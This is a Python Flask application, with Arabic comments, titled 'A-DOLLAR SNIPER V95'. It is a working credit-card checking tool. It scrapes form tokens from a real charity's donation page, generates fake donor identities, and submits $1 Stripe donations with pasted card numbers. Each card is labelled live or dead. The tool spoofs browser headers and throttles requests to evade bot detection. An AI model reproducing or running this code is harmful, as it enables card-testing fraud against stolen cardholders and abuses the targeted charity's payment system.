import requests
import random
import string
import re
import time
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

# ترويسات قوية لمحاكاة متصفح Chrome وتجنب كشف البوتات
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Referer': 'https://adollarfortheworld.org/donate/',
    'Origin': 'https://adollarfortheworld.org'
}

def sniper_check(cc_data):
    session = requests.Session()
    try:
        # 1. جلب التوكنات (Nonce) والـ Form ID شبر شبر
        main_page = session.get("https://adollarfortheworld.org/donate/", headers=HEADERS, timeout=20)
        
        # استخدام regex مرن جداً للبحث عن التوكنات
        nonce = re.search(r'give-nonce" value="(.*?)"', main_page.text)
        form_id = re.search(r'give-form-id" value="(.*?)"', main_page.text)
        
        if not nonce or not form_id:
            # محاولة أخيرة للبحث عن التوكن في كود الجافاسكريبت
            nonce = re.search(r'"nonce":"(.*?)"', main_page.text)
            form_id = re.search(r'"form_id":"(.*?)"', main_page.text)
            
            if not nonce:
                return {"cc": cc_data, "status": "ERROR", "msg": "Security Shield Active (Nonce Not Found)"}

        nonce_val = nonce.group(1)
        form_val = form_id.group(1) if form_id else "123"

        # 2. تقطيع بيانات البطاقة (CC|MM|YY|CVV)
        parts = cc_data.split('|')
        n, m, y, c = parts[0], parts[1], parts[2], parts[3]
        exp_year = f"20{y}" if len(y) == 2 else y

        # 3. توليد هوية وهمية لكل عملية
        fname = "".join(random.choices(string.ascii_lowercase, k=6)).capitalize()
        lname = "".join(random.choices(string.ascii_lowercase, k=6)).capitalize()
        email = f"{fname.lower()}{random.randint(100,999)}@gmail.com"

        # 4. تجهيز الـ Payload (بيانات التبرع)
        payload = {
            'give-form-id': form_val,
            'give-nonce': nonce_val,
            'give-amount': '1.00',
            'give_first': fname,
            'give_last': lname,
            'give_email': email,
            'card_number': n.replace(" ", ""),
            'card_cvc': c.replace(" ", ""),
            'card_exp_month': m,
            'card_exp_year': exp_year,
            'give_action': 'purchase',
            'gateway': 'stripe',
            'give_ajax': '1'
        }

        # 5. إرسال طلب التبرع النهائي
        target_url = "https://adollarfortheworld.org/donate/?payment-mode=stripe"
        response = session.post(target_url, data=payload, headers=HEADERS, timeout=30)

        # 6. تحليل النتيجة
        res_text = response.text.lower()
        if "thank you" in res_text or "success" in res_text or "confirm" in res_text:
            return {"cc": cc_data, "status": "LIVE", "msg": "Approved ✅"}
        elif "insufficient" in res_text:
            return {"cc": cc_data, "status": "LIVE", "msg": "Low Funds 💰"}
        elif "declined" in res_text or "expired" in res_text or "incorrect" in res_text:
            return {"cc": cc_data, "status": "DEAD", "msg": "Declined ❌"}
        else:
            return {"cc": cc_data, "status": "DEAD", "msg": "Gateway Error / Security Block"}

    except Exception as e:
        return {"cc": cc_data, "status": "ERROR", "msg": f"Connection Error: {str(e)[:30]}"}

# واجهة المستخدم الاحترافية
@app.route('/')
def index():
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <title>A-DOLLAR SNIPER V95</title>
        <style>
            body { background: #000; color: #00ff41; font-family: 'Courier New', monospace; text-align: center; padding: 20px; }
            .main-box { border: 2px solid #00ff41; padding: 30px; border-radius: 15px; background: #050505; display: inline-block; box-shadow: 0 0 20px #00ff4133; }
            textarea { width: 450px; height: 180px; background: #000; color: #fff; border: 1px solid #333; padding: 10px; font-family: monospace; }
            button { width: 100%; padding: 15px; background: #00ff41; color: #000; border: none; font-weight: bold; cursor: pointer; margin-top: 10px; border-radius: 5px; font-size: 1.1rem; }
            .log { margin-top: 20px; text-align: left; height: 300px; overflow-y: auto; border-top: 1px solid #222; padding-top: 10px; }
            .LIVE { color: #fdfd00; font-weight: bold; text-shadow: 0 0 5px yellow; }
            .DEAD { color: #ff3e3e; }
        </style>
    </head>
    <body>
        <div class="main-box">
            <h1>[ A-DOLLAR SNIPER V95 ]</h1>
            <p style="color:#888;">نظام القنص التلقائي - بفاصل زمني 5 ثوانٍ</p>
            <textarea id="ccs" placeholder="4532XXXXXXXXXXXX|MM|YY|CVV"></textarea><br>
            <button id="btn" onclick="startHunting()">بدء العملية ⚡</button>
            <div id="status" style="margin: 10px; color: #00bcff;"></div>
            <div id="log" class="log">بانتظار البطاقات...</div>
        </div>

        <script>
            const sleep = ms => new Promise(res => setTimeout(res, ms));

            async function startHunting() {
                const btn = document.getElementById('btn');
                const list = document.getElementById('ccs').value.split('\\n').filter(x => x.trim() !== "");
                const log = document.getElementById('log');
                const status = document.getElementById('status');

                if(list.length === 0) return alert("ضع البطاقات أولاً!");
                
                btn.disabled = true;
                btn.style.opacity = "0.5";
                log.innerHTML = "";

                for(let i=0; i < list.length; i++) {
                    status.innerHTML = `⏳ جاري فحص ${i+1} من أصل ${list.length}...`;
                    
                    try {
                        const response = await fetch('/api/check', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({cc: list[i].trim()})
                        });
                        const data = await response.json();
                        
                        const div = document.createElement('div');
                        div.className = data.status;
                        div.innerHTML = `[${data.status}] ${data.cc} -> ${data.msg}`;
                        log.prepend(div);
                        
                    } catch(e) {
                        log.innerHTML = `<div style="color:orange">[ERROR] خطأ في الاتصال بالسيرفر</div>` + log.innerHTML;
                    }

                    if (i < list.length - 1) {
                        status.innerHTML = "💤 انتظار 5 ثوانٍ لتجنب الحظر...";
                        await sleep(5000);
                    }
                }
                status.innerHTML = "✅ اكتملت المهمة!";
                btn.disabled = false;
                btn.style.opacity = "1";
            }
        </script>
    </body>
    </html>
    ''')

@app.route('/api/check', methods=['POST'])
def api_check():
    cc = request.json.get('cc')
    return jsonify(sniper_check(cc))

if __name__ == "__main__":
    import os
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
